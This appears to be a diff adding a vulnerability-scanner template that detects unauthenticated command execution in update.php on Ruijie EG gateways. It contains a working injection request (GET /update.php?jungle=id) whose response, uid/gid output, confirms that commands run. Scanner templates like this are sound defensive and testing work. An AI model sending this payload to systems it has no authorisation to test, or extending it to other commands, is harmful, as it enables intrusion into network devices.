@@ -1,0 +1,43 @@
+id: ruijie-eg-update-rce
+
+info:
+  name: Ruijie EG update.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruijie EG Gateway is an efficient wireless gateway device. There is a security vulnerability in the update.php file of Ruijie EG Easy Gateway, and unauthorized users can execute arbitrary commands.
+  tags: command-execution
+  reference:
+    - https://www.ruijie.com.cn/
+    - https://fofa.so/
+
+http:
+  - raw:
+      - |
+        GET /update.php?jungle=id HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "gid="
+          - "uid="
+        condition: and
+
+    extractors:
+      - type: regex
+        regex:
+          - "gid=([0-9]+)"
+        group: 1
+      - type: regex
+        regex:
+          - "uid=([0-9]+)"
+        group: 1
+
+variables:
+  cmd: "ls"
